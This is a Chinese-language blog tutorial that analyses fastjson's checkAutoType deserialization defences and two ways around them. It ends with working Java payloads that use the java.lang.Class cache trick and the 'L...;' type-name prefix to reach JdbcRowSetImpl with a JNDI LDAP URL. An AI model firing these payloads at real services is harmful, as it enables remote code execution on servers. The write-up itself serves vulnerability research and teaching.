参考视频：[fastjson反序列化漏洞3-<=1.2.47绕过_哔哩哔哩_bilibili](https://www.bilibili.com/video/BV1bG4y157Ef/?spm_id_from=333.788&vd_source=686636e30f91f8a12e28751943870859)

# 分析版本

fastjson1.2.24

JDK 8u141

# 分析流程

分析fastjson1.2.25更新的源码，用JsonBcel链跟进

先看修改的地方

fastjson1.2.24

```java
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
    String typeName = lexer.scanSymbol(symbolTable, '"');
    Class<?> clazz = TypeUtils.loadClass(typeName, config.getDefaultClassLoader());
```

fastjson1.2.25

```java
if (key == JSON.DEFAULT_TYPE_KEY && !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
    String typeName = lexer.scanSymbol(symbolTable, '"');
    Class<?> clazz = config.checkAutoType(typeName, null);
```

可以看到loadClass的方法，被替换了，主要的安全逻辑就在替换的方法里，跟进看替换的方法`Class<?> clazz = config.checkAutoType(typeName, null);`

里面是很多if语句，黑白名单判断（分析写在注释）

```java
public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
    if (typeName == null) {
        return null;
    }

    final String className = typeName.replace('$', '.'); //替换下内部类符号

    if (autoTypeSupport || expectClass != null) {    //autoTypeSupport默认false，expectClass默认null，这个判断默认为false
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];     //白名单默认为空
            if (className.startsWith(accept)) {
                return TypeUtils.loadClass(typeName, defaultClassLoader);
            }
        }

        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];    //黑名单，可以自己debug看看
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
    }

    Class<?> clazz = TypeUtils.getClassFromMapping(typeName);//先在缓存中查找
    if (clazz == null) {
        clazz = deserializers.findClass(typeName);//缓存没有在已有的反序列化器中查找
    }

    if (clazz != null) { //找到类进入次判断
        if (expectClass != null && !expectClass.isAssignableFrom(clazz)) { //做个判断
            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
        }

        return clazz;
    }

    if (!autoTypeSupport) {//autoTypeSupport为true
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);

                if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
                return clazz;
            }
        }
    }

    if (autoTypeSupport || expectClass != null) {
        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
    }

    if (clazz != null) {

        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
                || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
                ) {
            throw new JSONException("autoType is not support. " + typeName);
        }

        if (expectClass != null) {
            if (expectClass.isAssignableFrom(clazz)) {
                return clazz;
            } else {
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
            }
        }
    }

    if (!autoTypeSupport) {
        throw new JSONException("autoType is not support. " + typeName);
    }

    return clazz;
}
```

关于checkAutoType方法的流程图，我放在我的github上了， ，，，，，有帮助的话大家可以star一下

我在图中return的位置都拿绿色标记了，很明显我们要绕过检测必须控制流程走到return处。而通过对流程图的分析

# 攻击实现

## autoTypeSupport参数为false

**autoTypeSupport参数和白名单我们无法控制的条件下**，我们发现只剩一个缓存加载的绕过方式了。下面看下能否利用。

发现缓存表mapping的put方式有两个位置，第一个位置很明显在初始化时被调用写入的缓存。

![image-20240801180024638](https://s2.loli.net/2024/08/01/1iPp2JCmbfZn43a.png)

看第二个位置能否利用，是在loadClass里面，我们可以看到这个loadClass用法就是，在缓存中没找到的类加载时把这个类加进缓存中。

![image-20240801192033746](https://s2.loli.net/2024/08/01/igCVEZfhJvLMQIW.png)

我们如果可以控制传参，并调用loadClass就可以把恶意类加入缓存中。之后继续找loadClass的调用

只有一处可能有利用点的地方，就是在MiscCodec下面，而MiscCodec继承了ObjectSerializer, ObjectDeserializer是个反序列化器。

```java
if (clazz == Class.class) {
    return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
}
```

而MiscCodec的利用就是在加载默认的反序列化器时，Class的反序列化器也是它。

```java
deserializers.put(Class.class, MiscCodec.instance);
```

所以绕过思路有了，我们先反序列化一个Class，它的值为恶意类，之后再反序列化恶意类。

写payload时，要注意传值，让程序执行到我们要调用的位置。

`return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());`这里strVal是我们要传的恶意类名，看下怎么赋值的。

```java
//MiscCodec#deserialze
if (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) {
    parser.resolveStatus = DefaultJSONParser.NONE;
    parser.accept(JSONToken.COMMA);

    if (lexer.token() == JSONToken.LITERAL_STRING) {
        if (!"val".equals(lexer.stringVal())) {           //注意这里不能抛出异常，如果抛出异常程序就走不到loadClass处了，所以我们传入的属性名应为val
            throw new JSONException("syntax error");
        }
        lexer.nextToken();
    } else {
        throw new JSONException("syntax error");
    }

    parser.accept(JSONToken.COLON);

    objVal = parser.parse();

    parser.accept(JSONToken.RBRACE);
} else {
    objVal = parser.parse();
}
```

下面就能写出payload了

```java
public class FastJsonBypass1 {
    public static void main(String[] args) throws Exception {
        String s = "{{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:10389/cn=Exp,dc=example,dc=com\",\"autoCommit\":0}}";
        JSONObject jsonObject = JSON.parseObject(s);
    }
}
```

跟一下利用流程

先看Class的反序列化

```java
//ParserConfig#checkAutoType
Class<?> clazz = TypeUtils.getClassFromMapping(typeName);   //在缓存中找不到
if (clazz == null) {
    clazz = deserializers.findClass(typeName);              //可以找到反序列化器，也就是MiscCodec，返回Class
}

if (clazz != null) {                                        //进入此循环
    if (expectClass != null && !expectClass.isAssignableFrom(clazz)) { //期望类为空，不进入此循环
        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
    }

    return clazz;   //返回Class
}
```

之后return调用

```java
//defaultJSONParser#parseObject
ObjectDeserializer deserializer = config.getDeserializer(clazz);  //调用返回MiscCodec反序列化器
return deserializer.deserialze(this, clazz, fieldName); //MiscCodec.deserialze
```

MiscCodec.deserialze把传入的String（也就是`com.sun.rowset.JdbcRowSetImpl`），反序列化为Class对象

lexer.stringVal()==val

![image-20240801210036755](https://s2.loli.net/2024/08/01/o57Aaq4GRh6wVlO.png)

再往下走到

```java
if (clazz == Class.class) {
    return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());  //loadClass（com.sun.rowset.JdbcRowSetImpl），并存入缓存
}
```

之后回到

```java
//defaultJSONParser#parseObject
return deserializer.deserialze(this, clazz, fieldName);  //MiscCodec.deserialze
```

之后进入下一轮循环，也就是反序列化com.sun.rowset.JdbcRowSetImpl

就不在这写了，都是这个流程。



## autoTypeSupport参数为true

如果autoTypeSupport开启的情况下，跟进流程图可以看到先过黑白名单之后才加载和返回类。

在上面分析时，我们也能注意到，在loadClass中有对传入类名的处理，对数组类进行处理，把`L`，`;`，[，直接去掉后加载，这里绕过黑名单很容易。

```java
public static Class<?> loadClass(String className, ClassLoader classLoader) {
    if (className == null || className.length() == 0) {
        return null;
    }

    Class<?> clazz = mappings.get(className);

    if (clazz != null) {
        return clazz;
    }

    if (className.charAt(0) == '[') {
        Class<?> componentType = loadClass(className.substring(1), classLoader);
        return Array.newInstance(componentType, 0).getClass();
    }

    if (className.startsWith("L") && className.endsWith(";")) {
        String newClassName = className.substring(1, className.length() - 1);
        return loadClass(newClassName, classLoader);
    }
```

payload

```java
public class FastJsonBypass1 {
    public static void main(String[] args) throws Exception {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);   //开启autoTypeSupport参数
        String s = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"ldap://localhost:10389/cn=Exp,dc=example,dc=com\",\"autoCommit\":0}";

        JSONObject jsonObject = JSON.parseObject(s);
        //Class
    }
}
```